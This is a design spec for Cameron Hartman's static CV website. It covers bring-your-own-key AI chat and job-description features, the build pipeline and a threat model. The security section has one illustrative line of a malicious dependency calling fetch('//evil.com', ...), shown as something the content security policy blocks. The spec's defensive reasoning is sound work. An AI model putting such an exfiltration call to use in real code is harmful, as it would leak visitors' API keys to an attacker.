# CV — Design Spec

- **Date:** 2026-05-09
- **Owner:** Cameron Hartman (`CAM-eEng`)
- **Status:** Draft, pending user review
- **Replaces:** `CAM-eEng/portfolio` (private, currently 404 — Pages disabled)
- **Target URL:** `https://cameronhartman.dev`

## 1. Overview

A static-first online CV that replaces the legacy `cam-eeng.github.io/portfolio` site. The new site demonstrates Cameron's AI literacy through three integrated AI features (chat-with-CV, JD analyzer, activity visualizer) that operate on a Bring-Your-Own-Key model — visitors connect their own AI account so all inference is billed to them, not Cameron.

The design is deliberately optimized for a 2026 reality where recruiters and hiring managers increasingly use AI agents to summarize, score, and surface candidates. The site emits clean semantic HTML, schema.org JSON-LD, a JSON Resume export at `/cv.json`, and an `/llms.txt` so AI agents can ingest the content cleanly. The interactive AI features layered on top showcase Cameron's ability to design and ship modern AI applications without leaning on a vector DB or a server-side proxy.

## 2. Goals & non-goals

### Goals
- Replace the legacy portfolio with a modern, polished CV at `cameronhartman.dev`.
- Serve three distinct visitor types well: 30-second recruiter skim, hiring-manager deep dive, networking/discovery.
- Demonstrate AI literacy through architecture choices, not just buzzwords.
- Cost Cameron $0 in runtime inference and ~$0 in hosting (just the domain).
- Be machine-readable: AI agents that scrape the site get high-quality structured data.
- Ship as a public repo so the implementation itself is part of the portfolio.

### Non-goals
- Building a CMS, blog, or comment system.
- Server-side AI proxy (defeats BYOK and adds Cameron-side liability).
- Vector DB / RAG infrastructure (overkill at CV-size; absence is intentional).
- Visitor accounts, sign-in, or any backend state.
- Email-list capture or growth-funnel mechanics.
- Multi-language / i18n support (English only).

## 3. Audience & success criteria

| Visitor | They came to | Success looks like |
| --- | --- | --- |
| Recruiter (30s skim) | Decide if Cameron is worth a callback | Hero summary + activity ticker + clear roles answers it without scrolling. PDF download in one click. |
| Hiring manager / engineer (deep dive) | Evaluate technical depth | Project case studies, code, embedded AI demos they can interact with. |
| Networking visitor | Form a professional impression | Distinctive design + about-the-person content + obvious contact links. |
| AI agent (acting on behalf of any of the above) | Extract structured info | Clean HTML, JSON-LD, `/cv.json`, `/llms.txt`. No JS required to read the CV. |

## 4. Architecture

### 4.1 Stack

- **Framework:** Astro 5 (content-first, ships zero JS by default; React 19 islands for interactive bits).
- **UI:** React 19 + Tailwind CSS 4 (Oxide engine) + shadcn/ui (via the React integration).
- **Language:** TypeScript 5.7+ in strict mode.
- **Runtime/PM:** Bun 1.x for installs and scripts; Node 20 in CI for compatibility.
- **AI client primitives:** Vercel AI SDK 5 (browser-side `useChat`, structured-output helpers, streaming).
- **Validation:** Zod for all structured-output schemas and content frontmatter.
- **Markdown:** MDX for project case studies (lets us embed React islands inline).
- **Testing:** Vitest 3 (unit), Playwright (one happy-path E2E in demo mode).
- **Linting:** ESLint + Prettier + `astro check`.

### 4.2 Hosting & deployment

- **Hosting:** GitHub Pages (free, no servers, perfect for the BYOK + static-build model).
- **Domain:** `cameronhartman.dev` via repo-root `CNAME` file.
- **CI/CD:** GitHub Actions, three workflows (see §8.1 for trigger rules):
  - `ci.yml` — typecheck + build + Lighthouse on every PR. **No secrets.**
  - `deploy.yml` — build + deploy to Pages on push to `main`.
  - `refresh-activity.yml` — nightly cron + manual trigger; fetches GitHub + HackTheBox data, writes `data/activity.json`, commits, deploys.
- **Branch protection:** `main` requires PR, passing checks, signed commits, no force-push.

## 6. Content & data layer

### 6.1 Single source of truth: `content/cv.yaml`

Conforms to **JSON Resume** schema (`https://jsonresume.org/schema/`). One file, hand-authored, validated by Zod on load. Driving choice: it's an open standard, so `/cv.json` is meaningful to any tool that knows JSON Resume, and there's a community of theme/parser projects we can borrow from.

Top-level keys: `basics`, `work`, `education`, `skills`, `projects`, `awards`, `certificates`, `publications`, `languages`, `interests`, `references`.

### 6.2 Project case studies: `content/projects/*.mdx`

Frontmatter:
```yaml
title: LedDisplay — CircuitPython matrix clock
slug: leddisplay
role: Solo
stack: [CircuitPython, Adafruit Matrix Portal S3, RGB LED matrix]
dates: { start: 2026-04, end: ongoing }
links:
  repo: https://github.com/CAM-eEng/...
  demo: ...
featured: true
summary: One-sentence pitch for the case-study card.
```

Body is long-form MDX (problem, approach, what I built, what I learned). React islands can be embedded inline for live demos.

### 6.3 Skills: `content/skills.yaml`

Categorized list with a `last_used` date per skill, used by the activity visualizer's "still warm" timeline:

```yaml
categories:
  - name: Embedded
    skills:
      - { name: CircuitPython, last_used: 2026-05 }
      - { name: STM32 (HAL/Cube), last_used: 2024-09 }
  - name: Frontend
    ...
```

## 7. AI features (BYOK)

### 7.1 Provider abstraction

```ts
// src/lib/ai/provider.ts
export interface AIProvider {
  id: 'openrouter' | 'anthropic' | 'openai' | 'demo';
  displayName: string;
  models: ModelInfo[];
  chat(opts: ChatOpts): AsyncIterable<ChatChunk>;
  structured<T>(opts: StructuredOpts<T>): Promise<T>;
  isCached(): boolean;  // whether prompt-caching is active
  cachedTokens(): number;
}
```

Four concrete implementations live in `src/lib/ai/{openrouter,anthropic,openai,demo}.ts`. The chat island and JD-analyzer island depend only on the interface.

### 7.2 Connection UX

First time a visitor opens an AI feature, a bottom sheet asks them to connect:

1. **Connect OpenRouter** (default, recommended) — launches PKCE OAuth flow. One click for visitors who already have an OpenRouter account; ~30 seconds to sign up if not. Free models available.
2. **Use my own API key** (advanced) — paste flow for Anthropic / OpenAI / Google. Clear "this stays in your browser, even browser extensions can read it" warning.
3. **Try demo mode** — pre-baked SSE-style streams of canned responses to common questions. Always works, no setup.

The chosen provider is stored in `sessionStorage` only (`byok_provider`, `byok_token`). Never `localStorage`. Vanishes on tab close. A persistent "Disconnect" button is visible whenever a key is loaded.

### 7.3 Chat-with-CV

- No vector DB. The full structured CV (~25k tokens) is concatenated into a system prompt with each provider's prompt-caching mechanism enabled.
- Anthropic: `cache_control: { type: 'ephemeral' }` on the system block.
- OpenRouter: cache control passed through to underlying providers.
- OpenAI: prompt caching is automatic for messages over 1024 tokens.
- The UI displays a small "cached: 24,891 tokens" pill so power users can see that we're not doing redundant inference. This is the design choice we want to surface.
- Streaming via `useChat` from Vercel AI SDK 5.
- Output rendering: markdown via a sanitized renderer (DOMPurify on output HTML).
- Citations: when the model references a specific section of the CV, the renderer detects bracketed references like `[work.0.highlights.2]` and renders them as clickable anchors back to the rendered `/cv` page.

### 7.4 JD analyzer

- Same provider, different prompt template.
- Structured output: a Zod-defined schema validated client-side:
  ```ts
  const JDFitSchema = z.object({
    fit_score: z.number().int().min(0).max(100),
    matched_skills: z.array(z.object({
      skill: z.string(),
      evidence: z.string(),       // points to a CV section
    })),
    gaps: z.array(z.string()),
    tailored_intro: z.string(),
    suggested_questions: z.array(z.string()),
  });
  ```
- Tool-use / structured-outputs feature of each provider.
- Renders as a scorecard (radial gauge for fit_score, two-column matched/gaps, copyable intro paragraph).

### 7.5 Activity visualizer (build-time data, not live)

- A nightly GitHub Actions cron (`refresh-activity.yml`) calls the GitHub API (with `GH_API_TOKEN`) and HackTheBox API (with `HTB_API_TOKEN`), writes `data/activity.json`, commits, redeploys.
- The committed file means the site renders correctly even if a fetch fails — last-known-good is always available.
- Renders client-side as React components (no AI inference involved in the visualizer itself; the AI angle is in chat/JD-analyzer):
  - Contribution heatmap (year)
  - Top-languages donut
  - Tech-freshness timeline (skills × `last_used`)
  - HTB rank, points, machines pwned, category breakdown
  - Featured-repo carousel (filtered by `featured: true` in `cv.yaml`)

### 7.6 What we deliberately don't build

- **Vector DB / embedding pipeline.** CV-sized corpus fits in cached system prompt — adding a vector DB would mask the architectural insight that you don't need one.
- **Server-side AI proxy.** Defeats BYOK; exposes Cameron to bill-amplification attacks.
- **Cross-session memory.** No accounts means no chat history; that's a feature, not a limitation.

## 8. Security model

The site has a meaningfully smaller attack surface than a typical app (no server, no DB, no auth backend), but introduces specific GitHub-Pages and BYOK risks. This section documents the threat model and the mitigations baked into the design. A plain-English version of this lives at `/security` for visitors.

### 8.1 Build pipeline

Risks: PAT exfil from PR forks, supply-chain compromise of npm dependencies or third-party Actions, secret leakage in build logs, direct push to main.

Mitigations:
- **Two-workflow split.**
  - `ci.yml` runs on `pull_request` events and has zero secrets. Forks can run it freely.
  - `deploy.yml` and `refresh-activity.yml` run only on `push: main` and `schedule:` / `workflow_dispatch`. They have access to secrets. Forks cannot trigger them.
  - **Never** use `pull_request_target` (the trigger that mixes secrets and untrusted code).
- **Action pinning.** Every third-party Action pinned to a 40-char commit SHA, not a version tag. Dependabot updates these.
- **Lockfile committed.** `bun.lock` committed; `bun pm audit` runs in CI.
- **Pre-commit secret scan.** `gitleaks` hook prevents accidental secret commits.
- **Branch protection.** Required PR, required status checks, signed commits, no force-push.
- **PAT hygiene.** Fine-grained PATs with read-only scope on public data, 90-day expiry, calendar-driven rotation.

### 8.2 BYOK (browser key handling)

Risks: XSS exfiltrating `sessionStorage`, supply-chain JS exfiltrating keys, OAuth code interception, phishing clones of the site.

Mitigations:
- **Strict CSP via meta tag.** `connect-src` allowlists only known provider hosts:
  ```
  connect-src 'self' https://api.anthropic.com https://api.openai.com
              https://generativelanguage.googleapis.com
              https://openrouter.ai
              https://api.github.com;
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  ```
  Even if a malicious dependency tries to `fetch('//evil.com', ...)` the browser blocks it.
- **No `dangerouslySetInnerHTML` on any AI-generated content.** All markdown rendered through DOMPurify with a strict allowlist.
- **`sessionStorage` only.** Never `localStorage`. A persistent "Disconnect" button always visible while a key is loaded.
- **PKCE for OAuth.** State parameter validated; authorization code scrubbed from URL via `history.replaceState` immediately on `/oauth/callback` load. No analytics or error trackers loaded on that page.
- **Visitor warning on paste.** The key-paste UI explicitly states browser extensions and compromised tabs can read the key.

### 8.3 Custom domain (`cameronhartman.dev`)

Risks: registrar account takeover, GitHub Pages takeover (if migration order is wrong), email spoofing of `*@cameronhartman.dev`, cert mis-issuance.

Mitigations:
- **Registrar:** hardware-key 2FA, registry-lock if the registrar supports it for `.dev`, multi-year registration with auto-renew.
- **DNS records, in this order (the order matters — see `READ-BEFORE-BURNING.md`):**
  1. `CAA` → `0 issue "letsencrypt.org"` (constrains who can issue certs; set before any cert request)
  2. `TXT` SPF: `v=spf1 -all` (no one is authorized to send mail from this domain)
  3. `TXT _dmarc` DMARC: `v=DMARC1; p=reject; rua=mailto:cameron.hartman081@gmail.com`
  4. `MX` null: `0 .` (RFC 7505 — explicitly accepts no mail)
  5. `CNAME` → `cam-eeng.github.io` (last; only after the locks above are live)
- **Pages-takeover prevention.** If we ever migrate off Pages, the order is: remove `CNAME` from DNS first, then change the repo. The reverse leaves a dangling CNAME that an attacker can claim.
- **HSTS preload.** `.dev` is on the HSTS preload list — browsers force HTTPS automatically.

### 8.4 Static-host header limitations

GitHub Pages does not allow custom HTTP response headers. We lose:
- `Content-Security-Policy` over HTTP — replaced by `<meta>` CSP, which works for most directives but not `frame-ancestors` or `report-uri`.
- `Strict-Transport-Security` — mitigated by `.dev` HSTS preload.
- `X-Frame-Options` — accepted gap; nothing on the site performs a state-changing action, so clickjacking impact is low. If iframe-embedding becomes a real concern later, migration target is Cloudflare Pages (same workflow, full header control).

### 8.5 Out-of-scope-by-architecture

These are not risks because the architecture excludes them: server-side AI proxy abuse, prompt-injection-induced billing damage (bill is the visitor's), credential stuffing (no accounts), SQL injection / SSRF (no backend), CSRF (no state-changing endpoints), DoS amplification (static files behind GitHub's CDN).

## 9. Quality bar

- **TypeScript** strict mode; `astro check` in CI.
- **Tests:**
  - Vitest unit tests covering: `cv.yaml` Zod validation, JSON-LD generators, JSON Resume export, the AI provider abstraction (with mocked transports), the OAuth callback URL parsing.
  - One Playwright E2E that exercises chat in demo mode (no real provider needed in CI).
- **Performance targets:** Lighthouse 95+ across Performance / Accessibility / Best Practices / SEO on all top-level pages. View Transitions API for smooth cross-page nav.
- **Accessibility:** WCAG AA. Keyboard-first navigation. Focus traps in the chat sheet. `prefers-reduced-motion` respected.
- **SEO:** Per-page `<title>`, `<meta description>`, OG images, JSON-LD, sitemap, RSS.
- **Privacy:** No analytics that fingerprint visitors. Optional: cookieless Plausible later if metrics become useful.

## 10. Out of scope (with reasoning)

| Excluded | Why |
| --- | --- |
| Vector DB / embeddings | CV fits in cached system prompt; their absence is the AI-literacy point |
| Server-side AI proxy | Defeats BYOK; would re-introduce billing & abuse exposure |
| Visitor accounts / auth | Not needed; no state to protect |
| CMS / blog / comments | Not stated as a need; YAGNI |
| Email-list capture | No growth-funnel intent stated |
| i18n | English-only audience |
| Native dark/light theme switcher | Use `prefers-color-scheme` only; one theme done well > two themes done okay |

## 11. Visual identity (deferred)

Visual style — typography, color, density, "personality" of the design — is intentionally deferred to the next phase. Three directions to compare in the visual companion before locking in:
- Editorial / serif (think *The Economist* online) — signals depth and considered craft.
- Technical / monospace-led — signals engineer-first.
- Minimal modern (sans, lots of whitespace) — signals clean execution.

Decision happens before implementation begins.

## 12. Open questions for implementation

These don't block the spec but need resolution during implementation:

1. **Resume PDF source.** Is the legacy `resume.pdf` in the old portfolio repo still accurate, or do we render a fresh PDF from `cv.yaml`? Recommendation: render fresh from `cv.yaml` so PDF and HTML never drift.
2. **Old `portfolio` repo disposition.** Archive, delete, or preserve as private? Recommendation: archive (preserves git history, prevents new commits, signals "moved").
3. **HackTheBox API stability.** HTB's API surface is undocumented and has historically changed. Need a fallback plan for when fields disappear (likely: schema-validate fetched response with Zod and silently drop unknown fields).
4. **Featured-projects threshold.** How many projects appear in the featured carousel vs. the long tail on `/projects`? Recommendation: 4 featured, rest in grid.
5. **OpenRouter model defaults.** Which model do we suggest first when a visitor connects via OpenRouter? Recommendation: a free model (`google/gemini-2.0-flash-exp:free` or similar) so the demo cost is zero.
